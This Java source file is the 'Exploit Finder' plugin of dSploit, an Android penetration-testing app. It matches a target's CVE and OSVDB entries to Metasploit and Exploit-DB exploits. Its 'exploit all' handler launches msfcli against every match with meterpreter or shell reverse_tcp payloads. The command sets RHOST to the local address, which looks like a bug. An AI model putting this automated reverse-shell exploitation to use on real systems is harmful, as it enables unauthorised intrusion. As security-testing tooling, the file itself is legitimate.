/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins;

import java.util.ArrayList;

import android.content.Context;
import android.graphics.Typeface;
import android.os.Bundle;
import android.text.Html;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.View.OnClickListener;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.ToggleButton;
import it.evilsocket.dsploit.MainActivity;
import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.core.Plugin;
import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.core.Shell;
import it.evilsocket.dsploit.gui.dialogs.FinishDialog;
import it.evilsocket.dsploit.net.Target;
import it.evilsocket.dsploit.net.Target.Vulnerability;
import it.evilsocket.dsploit.net.Target.Exploit;

public class ExploitFinder extends Plugin 
{
	private final static String  TAG = "EXPLOITFINDER";

	private ToggleButton       mSearchToggleButton = null,
							   mExploitAllToggleButton = null;
	private ProgressBar	       mSearchProgress     = null;
	private ListView 		   mListView		   = null;		
	private boolean	           mRunning			   = false;
	private Thread			   mThread			   = null;
	private ArrayList<Exploit> results = new ArrayList<Exploit>();
	private ExploitAdapter mAdapter = null;
	
	public class ExploitAdapter extends ArrayAdapter<Exploit> 
	{		
		class ExploitHolder
	    {
	        ImageView  itemImage;
	        TextView   itemTitle;
	        TextView   itemDescription;
	    }
		
		public ExploitAdapter(  ) {
	        super( ExploitFinder.this, R.layout.plugin_exploit_finder_item  );	        
	    }

		@Override
		public int getCount(){
			return System.getCurrentExploits().size();
		}
		
		@Override
	    public View getView( int position, View convertView, ViewGroup parent ) {		
	        View 		 row    = convertView;
	        ExploitHolder holder = null;
	        
	        if( row == null )
	        {
	            LayoutInflater inflater = ( LayoutInflater )ExploitFinder.this.getSystemService( Context.LAYOUT_INFLATER_SERVICE );
	            row = inflater.inflate( R.layout.plugin_exploit_finder_item , parent, false );
	            
	            holder = new ExploitHolder();
	            
	            holder.itemImage  	   = ( ImageView )row.findViewById( R.id.itemIcon );
	            holder.itemTitle  	   = ( TextView )row.findViewById( R.id.itemTitle );
	            holder.itemDescription = ( TextView )row.findViewById( R.id.itemDescription );

	            row.setTag(holder);
	        }
	        else
	        {
	            holder = ( ExploitHolder )row.getTag();
	        }
	        
	        Exploit exploit = System.getCurrentExploits().get(position);
	        
	        if( exploit.msf_name != null)
	        {
	        	holder.itemTitle.setText
	        	(
	    			Html.fromHtml
		        	(
		        	  "<b>" + exploit.msf_name + "</b>"
		  			)
	        	);
	        }
	        else
	        	holder.itemTitle.setText( exploit.name );
	        
        	holder.itemTitle.setTypeface( null, Typeface.NORMAL );
        	holder.itemImage.setImageResource( exploit.getDrawableResourceId() );
        	holder.itemDescription.setText( exploit.getDescription() );
        		       	       	        
	        return row;
	    }
	}

	
	public ExploitFinder() {
		super
		( 
		    "Exploit Finder", 
		    "Search for exploit that matches found vulnerabilities.", 
		    new Target.Type[]{ Target.Type.ENDPOINT, Target.Type.REMOTE }, 
		    R.layout.plugin_exploit_finder,
		    R.drawable.action_exploit_finder 
		);
	}
		
	private void setStartedState( ) {
		mSearchProgress.setVisibility( View.VISIBLE );
		mRunning = true;
		
		mThread = new Thread( new Runnable()
		{ 
			@Override
			public void run() 
			{
				for( final ArrayList<Vulnerability> vulns : System.getCurrentTarget().getVulnerabilities().values() )
		        {
					for ( final Vulnerability vuln : vulns)
					{
						if( !mRunning ) return;
						Exploit ex;
	    				if(vuln.osvdb_id!=0)
	    				{
	    					ex = MSFDatabase.search_by_osvdb(vuln.osvdb_id); 
	    					if(ex!=null)
	    					{
	    						results.add(ex);
	    					}
	    					else
	    					{
	    						for( final Exploit exp : EXDatabase.search_by_osvdb(vuln.osvdb_id))
	    							results.add(exp);
	    					}
	    				}
	    				if(vuln.cve_id!=null)
	    				{
	    					// substring remove "CVE-"
	    					ex = MSFDatabase.search_by_cve(vuln.cve_id.substring(4)); 
	    					if(ex != null)
	    					{
	    						results.add(ex);
	    					}
	    					else
	    					{
	    						for( final Exploit exp : EXDatabase.search_by_cveid(vuln.cve_id.substring(4)))
	    							results.add(exp);
	    					}
	    				}
					}
		        }
		        		
	    		if( results == null )
	    		{
	    			// error parsing the page
	    			Log.e( TAG, "No exploits found." );
	    		}
	    		else if( results.size() > 0 )
	    		{
	    			for( final Exploit ex : results )
	    			{
	    				System.addExploit(ex);
	    				
		    			ExploitFinder.this.runOnUiThread( new Runnable() {
							@Override
							public void run()
							{
								mAdapter.add(ex);
							}							
						});	
	    			}
	    		}
	    		else
	    		{
	    			
	    			ExploitFinder.this.runOnUiThread( new Runnable() {
						@Override
						public void run()
						{
							new FinishDialog( "Warning", "No exploits found.", ExploitFinder.this ).show();
						}
	    			});
	    		}
				ExploitFinder.this.runOnUiThread( new Runnable() {
					@Override
					public void run()
					{						
						setStoppedState();
					}					
				});	
			}
		});
		
		mThread.start();
	}
	
	private void setStoppedState( ) {		
		try
		{
			if( mThread != null )
			{
				mThread.interrupt();
				mThread.stop();
			}
		}
		catch( Exception e )
		{
			
		}
		
		mRunning = false;
		mSearchToggleButton.setChecked( false );    
		mSearchProgress.setVisibility( View.GONE );
	}
	
	public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);   
        
        if( System.getCurrentTarget().hasOpenPorts() == false )
        	new FinishDialog( "Warning", "No open ports detected on current target, run the service inspector first.", this ).show();
        
        else if( System.getCurrentTarget().hasOpenPortsWithService() == false )
        	new FinishDialog( "Warning", "No specific informations about services running on target machine, run the service inspector first.", this ).show();
                
        else if( System.getCurrentTarget().hasVulnerabilities() == false)
        	new FinishDialog( "Warning", "No vulnerabilities found about this target. rune the VulnerabilityFinder first.", this ).show();
        mSearchToggleButton = ( ToggleButton )findViewById( R.id.searchToggleButton );
        mExploitAllToggleButton = (ToggleButton)findViewById(R.id.exploitToggleButton);
        mSearchProgress	   = ( ProgressBar )findViewById( R.id.searchActivity );
        mListView		   = ( ListView )findViewById( android.R.id.list );
        mAdapter		   = new ExploitAdapter();
        
        		        
        mListView.setAdapter( mAdapter );
        /*
        mListView.setOnChildClickListener( new OnChildClickListener(){
			@Override
			public boolean onChildClick( ExpandableListView parent, View v, int groupPosition, int childPosition, long id ) {
				Vulnerability cve = ( Vulnerability )mAdapter.getChild(groupPosition, childPosition);
				
				if( cve != null )
				{
					String uri     = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=" + cve.getIdentifier();
					Intent browser = new Intent( Intent.ACTION_VIEW, Uri.parse( uri ) );
					
					startActivity( browser );
				}
				
				return true;
			}}
        );
        
		for( int i = 0; i < mAdapter.getGroupCount(); i++ )
		{
			mListView.expandGroup( i );
		}*/
                
        mSearchToggleButton.setOnClickListener( new OnClickListener(){
			@Override
			public void onClick(View ex) {
				if( mRunning )
				{
					setStoppedState();
				}
				else
				{
					setStartedState();
				}
			}} 
		);
        
        mExploitAllToggleButton.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View ex) {
				String local_addr;
				try
				{
					Shell.exec("chroot "+System.getSettings().getString("PREF_CHROOT_PATH", "/data/gentoo_msf"));
					local_addr = System.getNetwork().getLocalAddress().toString();
				}
				catch ( Exception e)
				{
					e.printStackTrace();
					return;
				}
				for(Exploit exp : System.getCurrentExploits())
				{
					String cmd;
					if(exp.started)
						continue;
					//TODO: check for it on Preferences
					//TODO: test if we have to use msfcli or msfrpc
					cmd = "msfcli4.4 " + exp.msf_name;
					if(System.getCurrentTarget().getDeviceOS().toLowerCase().indexOf("windows") >= 0)
						cmd += " PAYLOAD=windows/meterpreter/reverse_tcp RHOST=";
					else
						cmd += " PAYLOAD=linux/x86/shell/reverse_tcp RHOST=";
					cmd += local_addr;
					cmd += " E";
					Shell.async(cmd);
					exp.started =  true;
				}
			}
		});
	}
	
	@Override
	public void onBackPressed() {
	    setStoppedState();	
	    super.onBackPressed();
	    overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);	    	    
	}
}
